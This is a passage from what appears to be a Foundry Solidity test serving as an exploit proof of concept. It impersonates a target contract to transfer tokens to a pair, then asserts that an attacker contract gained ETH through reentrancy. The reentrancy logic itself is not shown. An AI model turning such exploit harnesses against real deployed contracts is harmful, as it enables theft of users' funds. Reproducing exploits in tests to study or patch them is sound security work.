        // We need to impersonate the contract to transfer
        vm.startPrank(TARGET);
        token.transfer(pair, minSwap);
        vm.stopPrank();

        // Check final ETH balance
        uint256 finalEth = address(attackerContract).balance;
        console.log("Final attacker ETH:", finalEth);

        // Assert profit was made
        assertGt(finalEth, initialEth, "Attacker should have gained ETH from reentrancy");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

